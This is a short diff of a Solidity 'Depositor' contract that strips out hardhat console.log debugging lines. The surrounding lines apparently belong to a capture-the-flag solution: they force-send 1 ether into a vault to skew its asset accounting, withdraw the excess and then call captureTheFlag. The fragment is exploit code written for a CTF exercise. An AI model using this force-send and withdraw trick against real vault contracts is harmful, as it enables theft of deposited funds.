@@ -4,8 +4,6 @@ import "./Vault.sol";
 import "./ForceSendEther.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-import "hardhat/console.sol";
-
 contract Depositor is Ownable {
     address payable public immutable vault;
     bool flag;
@@ -35,15 +33,8 @@ contract Depositor is Ownable {
         ForceSendEther fse = new ForceSendEther();
         fse.forceSend{value: 1 ether}(vault);
 
-        console.log(
-            "totalAssets=%d, totalSupply=%d",
-            v.totalAssets(),
-            v.totalSupply()
-        );
-
         // withdraw ETH with excess
         v.withdraw(1 ether, address(this), address(this));
-        console.log("vaultBalance=%d", vault.balance);
 
         // CTF
         v.captureTheFlag(msg.sender);
